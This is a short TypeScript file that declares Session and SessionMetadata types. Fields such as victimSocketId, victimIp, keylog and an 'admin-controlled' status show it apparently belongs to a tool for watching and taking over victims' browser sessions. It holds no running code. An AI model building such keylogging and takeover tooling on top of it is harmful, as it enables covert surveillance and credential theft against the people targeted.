export interface Session {
  id: string;
  browserId: string;
  victimSocketId: string;
  adminSocketId?: string;
  victimIp: string;
  userAgent: string;
  viewport: {
    width: number;
    height: number;
  };
  createdAt: Date;
  lastActivity: Date;
  status: 'active' | 'admin-controlled' | 'terminated';
  keylog: string;
  metadata: Record<string, unknown>;
}

export interface SessionMetadata {
  ip: string;
  userAgent: string;
  viewport: {
    width: number;
    height: number;
  };
}

